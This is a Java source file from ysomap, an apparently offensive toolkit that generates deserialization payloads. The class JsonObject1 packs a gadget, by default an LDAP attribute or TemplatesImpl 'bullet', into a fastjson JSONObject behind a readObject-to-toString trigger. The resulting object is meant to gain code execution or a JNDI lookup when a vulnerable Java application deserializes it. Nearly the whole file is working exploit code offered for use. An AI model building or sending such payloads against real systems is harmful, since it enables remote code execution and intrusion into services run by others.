package ysomap.payloads.java.fastjson;

import com.alibaba.fastjson.JSONObject;
import ysomap.bullets.Bullet;
import ysomap.bullets.jdk.LdapAttributeBullet;
import ysomap.common.annotation.*;
import ysomap.core.util.PayloadHelper;
import ysomap.payloads.AbstractPayload;

import java.util.ArrayList;
import java.util.List;

/**
 * @author wh1t3p1g
 * @since 2022/9/5
 */
@Payloads
@SuppressWarnings({"rawtypes"})
@Authors({ Authors.WH1T3P1G })
@Targets({Targets.JDK, Targets.JNDI})
@Require(bullets = {
        "LdapAttributeBullet",
        "TemplatesImplBullet"}, param = false)
@Dependencies({"fastjson"})
public class JsonObject1 extends AbstractPayload<Object> {

    @Override
    public Bullet getDefaultBullet(Object... args) throws Exception {
        return LdapAttributeBullet.newInstance(args);
    }

    @Override
    public Object pack(Object obj) throws Exception {
        List<Object> arrays = new ArrayList<>();
        arrays.add(obj);
        JSONObject map = new JSONObject(); // also JSONArray
        map.put("ysomap", obj);
        arrays.add(PayloadHelper.makeReadObjectToStringTrigger(map));
        return arrays;
    }
}
